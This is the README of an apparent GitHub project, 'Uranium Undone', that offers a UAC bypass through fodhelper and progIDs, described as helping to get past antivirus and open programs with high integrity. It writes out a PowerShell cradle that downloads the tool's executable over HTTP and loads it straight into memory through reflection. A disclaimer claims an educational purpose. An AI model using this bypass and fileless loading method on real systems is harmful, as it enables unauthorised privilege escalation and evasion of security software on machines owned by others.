# Uranium_Undone
Uranium Undone is a simple UAC bypass using fodhelper with progIDs to help get past AV. Last tested 3/15/2022.  
![image](https://user-images.githubusercontent.com/15575425/158689240-ee26005f-0b65-400c-a36f-f2400fe9f2f3.png)


## Usage 
Execute Program and then enter the command to execute as needed. Program cleans up key after execution is complete.   
Should open the program in a High INT context.  
![image](https://user-images.githubusercontent.com/15575425/158689152-0dccaf68-848d-451e-a6a1-163834382959.png)

## load in memory
1. "$data = (New-Object System.Net.WebClient).DownloadData('http://127.0.0.1:8081/Uranium_Undone.exe')"  
2. "$assem =[System.Reflection.Assembly]::Load($data)"  
3. "[Uranium_Undone.Program]::Main(" ")"  
**Double quotes on outsides of commands not needed are just for formatting**  

![image](https://user-images.githubusercontent.com/15575425/158689912-48fdac6c-eb19-4e45-98e2-2b9a1b57fc18.png)

## credit
Based on Joe Helle's (The mayor) Articles https://medium.themayor.tech/utilizing-a-common-windows-binary-to-escalate-to-system-privileges-c16482cced4b

## Disclaimer
I am not responsible for actions taken by users of Uranium Undone. Uranium Undone was released solely for educational and ethical purposes.  
